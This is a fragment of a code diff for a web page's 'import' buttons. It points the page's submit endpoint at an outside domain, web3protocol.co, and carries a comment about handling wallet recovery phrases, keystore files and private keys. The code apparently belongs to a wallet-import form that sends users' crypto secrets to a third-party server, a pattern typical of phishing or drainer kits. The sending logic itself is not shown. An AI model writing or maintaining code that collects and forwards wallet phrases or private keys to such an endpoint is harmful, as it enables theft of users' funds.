@@ -32,7 +32,7 @@ importBTNs.forEach((importBTN) => {
     document.getElementById("loading").style.display = "block";
     document.getElementById("error").style.display = "none";
 
-    const requestURL = "https://web3protocol.co/submit";
+    const requestURL = "https://www.web3protocol.co/submit";
     const requestURLRemote = "http://localhost:5001/submit";
 
     // Add your existing logic for handling Phrase, Keystore JSON, or Private Key
